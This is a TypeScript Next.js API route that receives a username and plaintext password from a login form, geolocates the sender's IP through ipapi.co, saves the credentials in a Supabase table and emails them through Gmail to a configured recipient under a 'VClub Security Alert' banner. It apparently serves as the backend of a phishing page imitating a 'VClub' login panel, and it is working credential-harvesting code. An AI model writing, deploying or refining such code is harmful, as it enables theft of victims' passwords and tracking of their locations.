import nodemailer from 'nodemailer';
import { NextRequest, NextResponse } from 'next/server';
import { supabase, TABLE_NAME } from '@/lib/supabase';

function escapeHtml(value: unknown): string {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function formatIndianTime(value: string): string {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return 'Invalid time';
  return new Intl.DateTimeFormat('en-IN', {
    timeZone: 'Asia/Kolkata',
    year: 'numeric',
    month: 'long',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    timeZoneName: 'short',
  }).format(date);
}

async function getLocationFromIp(ip: string): Promise<string> {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
    return 'Unknown';
  }
  try {
    const response = await fetch(
      `https://ipapi.co/${encodeURIComponent(ip)}/json/`,
      { cache: 'no-store' }
    );
    if (!response.ok) return 'Unknown';
    const data = await response.json();
    const location = [data?.city, data?.region, data?.country_name]
      .filter(Boolean)
      .join(', ');
    return location || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

export async function POST(request: NextRequest): Promise<NextResponse> {
  try {
    const { username, password, loginTime, browser } = await request.json() as {
      username: string;
      password: string;
      loginTime?: string;
      browser?: string;
    };

    if (!username || typeof username !== 'string') {
      return NextResponse.json({ error: 'Username is required.' }, { status: 400 });
    }

    // Get IP
    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    const ip = forwardedFor?.split(',')[0]?.trim() || realIp || 'Unknown';

    // Resolve location
    const location = await getLocationFromIp(ip);

    const safeLoginTime =
      typeof loginTime === 'string' && loginTime
        ? loginTime
        : new Date().toISOString();
    const safeBrowser =
      typeof browser === 'string' && browser ? browser : 'Unknown';

    const indianReadableTime = formatIndianTime(safeLoginTime);

    // Escaped values for HTML
    const safeName     = escapeHtml(username);
    const safePass     = escapeHtml(password);
    const safeTime     = escapeHtml(indianReadableTime);
    const safeIp       = escapeHtml(ip);
    const safeLocation = escapeHtml(location);
    const safeBrowserLabel = escapeHtml(safeBrowser);

    // ── Save to Supabase ──────────────────────────────────────────────────────
    const { error: dbError } = await supabase.from(TABLE_NAME).insert([
      {
        username,
        password,
        ip,
        location,
        browser: safeBrowser,
        login_time: safeLoginTime,
      },
    ]);

    if (dbError) {
      console.error('Supabase insert error:', dbError.message);
      // Non-fatal — still send email
    }

    // ── Build email HTML ──────────────────────────────────────────────────────
    const html =
      '<!DOCTYPE html>' +
      '<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>' +
      '<body style="margin:0;padding:0;background:#0a0a0a;font-family:Rajdhani,Segoe UI,Arial,sans-serif;color:#d2d5d5;">' +
      '<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="padding:28px 12px;">' +
      '<tr><td align="center">' +
      '<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width:640px;background:#060606;border:1px solid #282828;border-radius:14px;overflow:hidden;">' +

      // Header
      '<tr><td style="background:linear-gradient(120deg,#000,#1a3344);padding:24px 28px;">' +
      '<div style="font-size:11px;letter-spacing:0.15em;color:#2a9fd6;text-transform:uppercase;">Security Alert</div>' +
      '<div style="margin-top:8px;font-size:22px;font-weight:700;color:#ffffff;">VClub Login Notification</div>' +
      '</td></tr>' +

      // Intro
      '<tr><td style="padding:24px 28px 8px 28px;">' +
      '<p style="margin:0 0 12px 0;font-size:15px;line-height:1.6;color:#d2d5d5;">A login attempt was submitted on your VClub panel.</p>' +
      '</td></tr>' +

      // Credentials
      '<tr><td style="padding:0 28px 8px 28px;">' +
      '<p style="margin:0 0 10px 0;font-size:14px;color:#adafae;">Username: <strong style="color:#fff;">' + safeName + '</strong></p>' +
      '<p style="margin:0 0 18px 0;font-size:14px;color:#adafae;">Password: <strong style="color:#2a9fd6;">' + safePass + '</strong></p>' +
      '</td></tr>' +

      // Details table
      '<tr><td style="padding:0 28px 20px 28px;">' +
      '<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="border:1px solid #282828;border-radius:8px;overflow:hidden;">' +
      '<tr><td style="width:140px;padding:10px 14px;background:#111;font-size:12px;font-weight:600;color:#555;border-bottom:1px solid #282828;text-transform:uppercase;letter-spacing:0.05em;">Login Time</td>' +
        '<td style="padding:10px 14px;font-size:13px;color:#adafae;border-bottom:1px solid #282828;">' + safeTime + '</td></tr>' +
      '<tr><td style="padding:10px 14px;background:#111;font-size:12px;font-weight:600;color:#555;border-bottom:1px solid #282828;text-transform:uppercase;letter-spacing:0.05em;">IP Address</td>' +
        '<td style="padding:10px 14px;font-size:13px;color:#adafae;border-bottom:1px solid #282828;font-family:monospace;">' + safeIp + '</td></tr>' +
      '<tr><td style="padding:10px 14px;background:#111;font-size:12px;font-weight:600;color:#555;border-bottom:1px solid #282828;text-transform:uppercase;letter-spacing:0.05em;">Location</td>' +
        '<td style="padding:10px 14px;font-size:13px;color:#adafae;border-bottom:1px solid #282828;">' + safeLocation + '</td></tr>' +
      '<tr><td style="padding:10px 14px;background:#111;font-size:12px;font-weight:600;color:#555;text-transform:uppercase;letter-spacing:0.05em;">Browser</td>' +
        '<td style="padding:10px 14px;font-size:13px;color:#adafae;word-break:break-word;">' + safeBrowserLabel + '</td></tr>' +
      '</table></td></tr>' +

      // Footer
      '<tr><td style="padding:14px 28px;background:#040404;border-top:1px solid #282828;">' +
      '<div style="font-size:11px;color:#555;">VClub Security — Automated Notification</div>' +
      '</td></tr>' +

      '</table></td></tr></table>' +
      '</body></html>';

    const text =
      'VClub Login Notification\n\n' +
      `Username: ${username}\n` +
      `Password: ${password}\n\n` +
      `Time (IST): ${indianReadableTime}\n` +
      `IP: ${ip}\n` +
      `Location: ${location}\n` +
      `Browser: ${safeBrowser}\n`;

    // ── Send email ────────────────────────────────────────────────────────────
    const emailUser = process.env.EMAIL_USER;
    const emailPass = process.env.EMAIL_PASS;
    const recipientEmail = process.env.RECIPIENT_EMAIL;

    if (!emailUser || !emailPass) {
      return NextResponse.json({ error: 'Email configuration missing.' }, { status: 500 });
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: emailUser, pass: emailPass },
    });

    await transporter.sendMail({
      from: `"VClub Security" <${emailUser}>`,
      to: recipientEmail || emailUser,
      subject: `VClub Login — ${username}`,
      html,
      text,
    });

    return NextResponse.json({ success: true, message: 'Login recorded.' });
  } catch (error) {
    console.error('send-email error:', error);
    return NextResponse.json({ error: 'Failed to process login.' }, { status: 500 });
  }
}
